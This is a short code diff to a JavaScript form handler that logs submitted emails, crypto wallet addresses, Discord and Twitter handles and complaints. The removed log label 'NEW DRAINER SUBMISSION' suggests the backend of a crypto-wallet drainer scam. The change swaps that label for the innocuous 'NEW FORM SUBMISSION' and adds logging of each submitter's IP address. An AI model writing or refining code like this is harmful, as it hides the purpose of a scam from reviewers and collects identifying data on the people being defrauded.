@@ -7,21 +7,20 @@ export default function handler(req, res) {
     const { email, wallet, discord, twitter, complaint, submittedAt } = req.body;
 
     const submission = {
-        id: Date.now().toString(36),
+        id: Date.now().toString(36) + Math.random().toString(36).substr(2),
         email: email || "N/A",
         wallet: wallet || "N/A",
         discord: discord || "N/A",
         twitter: twitter || "N/A",
         complaint: complaint || "N/A",
         submittedAt: submittedAt || new Date().toISOString(),
-        timestamp: new Date().toISOString()
+        timestamp: new Date().toISOString(),
+        ip: req.headers['x-forwarded-for'] || req.ip
     };
 
-    console.log("🔥 NEW DRAINER SUBMISSION:");
+    // Log to console (you can see this in Vercel dashboard)
+    console.log("=== NEW FORM SUBMISSION ===");
     console.log(JSON.stringify(submission, null, 2));
-
-    // Optional: Save to file (works on Vercel)
-    // You can also connect to a database later
 
     res.status(200).json({
         success: true,
